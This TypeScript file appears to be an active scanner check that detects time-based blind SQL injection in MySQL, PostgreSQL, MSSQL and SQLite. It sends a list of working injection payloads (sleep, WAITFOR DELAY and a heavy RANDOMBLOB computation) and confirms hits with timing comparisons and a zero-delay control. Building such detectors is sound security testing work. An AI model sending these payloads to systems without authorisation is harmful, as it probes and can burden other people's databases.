import { continueWith, defineCheck, done, Severity } from "engine";
import { Tags } from "../../../types";
import {
  createRequestWithParameter,
  extractParameters,
  hasParameters,
  type Parameter,
} from "../../../utils";
import { keyStrategy } from "../../../utils/key";

/**
 * Multi-Database Time-Based Blind SQL Injection
 *
 * Improvements over original:
 * 1. Multi-DB: MySQL sleep(), PostgreSQL pg_sleep(), MSSQL WAITFOR DELAY, SQLite randomblob
 * 2. Reduced sleep to 5 seconds (was 10 — halves scan time)
 * 3. Double confirmation: if first hit triggers, re-send SAME payload to confirm timing
 * 4. Negative control: also sends a 0-second sleep to verify the delay is payload-caused
 * 5. Better threshold: delay must exceed baseline + SLEEP_SECONDS - 1s (instead of arbitrary 2.5s)
 * 6. Reports baseline vs payload timing in findings for easy triage
 */

type State = {
  params: Parameter[];
  pIndex: number;
  payIndex: number;
  baseline: number;
  stage: "baseline" | "test" | "confirm-positive" | "confirm-negative";
  hitPayload?: string;
  hitParam?: Parameter;
  hitTime?: number;
  hitReqId?: string;
  hitDb?: string;
};

// ── Configuration ────────────────────────────────────────────────────────────

const SLEEP_SECONDS = 5;
const THRESHOLD_MS = (SLEEP_SECONDS - 1) * 1000; // payload must add at least (sleep - 1) seconds

type TimePayload = {
  payload: string;
  db: string;
};

const TIME_PAYLOADS: TimePayload[] = [
  // ── MySQL ──
  { payload: `' AND SLEEP(${SLEEP_SECONDS})-- `,            db: "MySQL" },
  { payload: `' OR SLEEP(${SLEEP_SECONDS})-- `,             db: "MySQL" },
  { payload: `" AND SLEEP(${SLEEP_SECONDS})-- `,            db: "MySQL" },
  { payload: `1 AND SLEEP(${SLEEP_SECONDS})`,               db: "MySQL" },
  { payload: `') AND SLEEP(${SLEEP_SECONDS})-- `,           db: "MySQL" },
  { payload: `' AND (SELECT SLEEP(${SLEEP_SECONDS}))-- `,   db: "MySQL" },

  // ── PostgreSQL ──
  { payload: `'; SELECT pg_sleep(${SLEEP_SECONDS});-- `,    db: "PostgreSQL" },
  { payload: `' AND pg_sleep(${SLEEP_SECONDS})::text='1`,   db: "PostgreSQL" },
  { payload: `" AND pg_sleep(${SLEEP_SECONDS})::text="1`,   db: "PostgreSQL" },
  { payload: `1; SELECT pg_sleep(${SLEEP_SECONDS})-- `,     db: "PostgreSQL" },

  // ── Microsoft SQL Server ──
  { payload: `'; WAITFOR DELAY '0:0:${SLEEP_SECONDS}';-- `, db: "MSSQL" },
  { payload: `"; WAITFOR DELAY '0:0:${SLEEP_SECONDS}';-- `, db: "MSSQL" },
  { payload: `1; WAITFOR DELAY '0:0:${SLEEP_SECONDS}'-- `,  db: "MSSQL" },
  { payload: `') WAITFOR DELAY '0:0:${SLEEP_SECONDS}'-- `,  db: "MSSQL" },

  // ── SQLite (heavy computation as time proxy) ──
  { payload: `' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))-- `, db: "SQLite" },
];

// Negative control: same syntax but 0-second sleep (should be fast)
function makeNegativePayload(hit: TimePayload): string {
  switch (hit.db) {
    case "MySQL":
      return hit.payload.replace(`SLEEP(${SLEEP_SECONDS})`, "SLEEP(0)");
    case "PostgreSQL":
      return hit.payload.replace(`pg_sleep(${SLEEP_SECONDS})`, "pg_sleep(0)");
    case "MSSQL":
      return hit.payload.replace(`0:0:${SLEEP_SECONDS}`, "0:0:0");
    default:
      return hit.payload; // Can't easily negate SQLite computation payload
  }
}

// ═══════════════════════════════════════════════════════════════════════════════
// Check Definition
// ═══════════════════════════════════════════════════════════════════════════════

export default defineCheck<State>(({ step }) => {

  // ── Step 1: Collect params + measure baseline response time ──────────────
  step("baseline", async (state, ctx) => {
    const params = extractParameters(ctx);
    if (params.length === 0) return done({ state });

    let baseline = ctx.target.response?.getRoundtripTime?.() ?? 0;

    // If no baseline available, send a clean request to measure
    if (baseline === 0 || baseline === undefined) {
      try {
        const { response } = await ctx.sdk.requests.send(ctx.target.request.toSpec());
        baseline = response?.getRoundtripTime?.() ?? 0;
      } catch {
        baseline = 0;
      }
    }

    // Send a second baseline to get a more stable measurement
    try {
      const { response } = await ctx.sdk.requests.send(ctx.target.request.toSpec());
      const t2 = response?.getRoundtripTime?.() ?? 0;
      baseline = Math.max(baseline, t2); // Use the higher of the two as baseline
    } catch {}

    return continueWith({
      nextStep: "test",
      state: {
        ...state,
        params,
        pIndex: 0,
        payIndex: 0,
        baseline,
        stage: "test" as const,
      },
    });
  });

  // ── Step 2: Test payloads ────────────────────────────────────────────────
  step("test", async (state, ctx) => {
    if (state.pIndex >= state.params.length) return done({ state });
    const param = state.params[state.pIndex]!;

    if (state.payIndex >= TIME_PAYLOADS.length) {
      return continueWith({
        nextStep: "test",
        state: { ...state, pIndex: state.pIndex + 1, payIndex: 0 },
      });
    }

    const tp = TIME_PAYLOADS[state.payIndex]!;
    const testValue = String(param.value ?? "") + tp.payload;

    try {
      const spec = createRequestWithParameter(ctx, param, testValue);
      const { request, response } = await ctx.sdk.requests.send(spec);

      if (response) {
        const elapsed = response.getRoundtripTime?.() ?? 0;
        const delta = elapsed - state.baseline;

        if (delta >= THRESHOLD_MS) {
          // Potential hit — move to confirmation
          return continueWith({
            nextStep: "confirm-positive",
            state: {
              ...state,
              hitPayload: tp.payload,
              hitParam: param,
              hitTime: elapsed,
              hitReqId: request?.getId?.(),
              hitDb: tp.db,
              stage: "confirm-positive" as const,
            },
          });
        }
      }
    } catch {
      // Timeout might actually be evidence of injection, but we can't measure it
      // Move to next payload
    }

    return continueWith({
      nextStep: "test",
      state: { ...state, payIndex: state.payIndex + 1 },
    });
  });

  // ── Step 3: Confirmation — re-send the same payload ──────────────────────
  step("confirm-positive", async (state, ctx) => {
    const param = state.hitParam;
    if (!param || !state.hitPayload) return nextParam(state);

    try {
      const testValue = String(param.value ?? "") + state.hitPayload;
      const spec = createRequestWithParameter(ctx, param, testValue);
      const { response } = await ctx.sdk.requests.send(spec);

      if (response) {
        const elapsed = response.getRoundtripTime?.() ?? 0;
        const delta = elapsed - state.baseline;

        if (delta >= THRESHOLD_MS) {
          // Second hit confirms — now do negative control
          return continueWith({
            nextStep: "confirm-negative",
            state: { ...state, stage: "confirm-negative" as const },
          });
        }
      }
    } catch {}

    // Second attempt didn't trigger — likely a network spike, not real SQLi
    return nextParam(state);
  });

  // ── Step 4: Negative control — send 0-second sleep, should be fast ───────
  step("confirm-negative", async (state, ctx) => {
    const param = state.hitParam;
    if (!param || !state.hitPayload || !state.hitDb) return nextParam(state);

    const tp = TIME_PAYLOADS.find(p => p.payload === state.hitPayload);
    if (!tp) return nextParam(state);

    const negPayload = makeNegativePayload(tp);

    try {
      const negValue = String(param.value ?? "") + negPayload;
      const spec = createRequestWithParameter(ctx, param, negValue);
      const { response } = await ctx.sdk.requests.send(spec);

      if (response) {
        const negElapsed = response.getRoundtripTime?.() ?? 0;
        const negDelta = negElapsed - state.baseline;

        // Negative control should be fast — if it's also slow, likely a slow server, not SQLi
        if (negDelta >= THRESHOLD_MS) {
          // Negative control is also slow → false positive (server is just slow)
          return nextParam(state);
        }
      }
    } catch {
      // If negative fails, still report — conservative
    }

    // Positive confirmed + negative is fast → CONFIRMED blind SQLi
    return done({
      findings: [{
        name: `Time-Based Blind SQL Injection (${state.hitDb}) in '${param.name}'`,
        severity: Severity.CRITICAL,
        description:
          `Parameter \`${param.name}\` (${param.source}) is vulnerable to time-based blind SQL injection.\n\n` +
          `**Database:** ${state.hitDb}\n\n` +
          `**Payload:**\n\`\`\`\n${state.hitPayload}\n\`\`\`\n\n` +
          `**Timing evidence:**\n` +
          `- Baseline response: **${state.baseline}ms**\n` +
          `- Payload response: **${state.hitTime}ms**\n` +
          `- Delta: **${(state.hitTime ?? 0) - state.baseline}ms** (threshold: ${THRESHOLD_MS}ms)\n\n` +
          `**Confirmation:** The payload was sent twice (both slow) and a zero-delay ` +
          `control was fast, confirming the timing difference is caused by the injected sleep.`,
        correlation: {
          requestID: state.hitReqId ?? "",
          locations: [],
        },
      }],
      state,
    });
  });

  return {
    metadata: {
      id: "mysql-time-based-sqli",
      name: "Time-Based Blind SQL Injection (Multi-DB)",
      description:
        "Detects blind SQL injection via time delays. Supports MySQL (SLEEP), PostgreSQL " +
        "(pg_sleep), MSSQL (WAITFOR DELAY), and SQLite (heavy computation). Uses triple " +
        "confirmation: initial hit + re-test + negative control to minimize false positives.",
      type: "active",
      tags: [Tags.SQLI, Tags.INJECTION],
      severities: [Severity.CRITICAL],
      aggressivity: {
        minRequests: 3, // baseline + at least one payload
        maxRequests: TIME_PAYLOADS.length + 4, // +4 for baseline, confirm, negative
      },
    },
    dedupeKey: keyStrategy().withMethod().withHost().withPort().withPath().withQueryKeys().build(),
    initState: (): State => ({
      params: [], pIndex: 0, payIndex: 0, baseline: 0, stage: "baseline" as const,
    }),
    when: (t) => hasParameters(t),
  };
});

function nextParam(state: State) {
  const next = (state.pIndex ?? 0) + 1;
  if (next >= state.params.length) return done({ state });
  return continueWith({
    nextStep: "test",
    state: { ...state, pIndex: next, payIndex: 0, stage: "test" as const },
  });
}
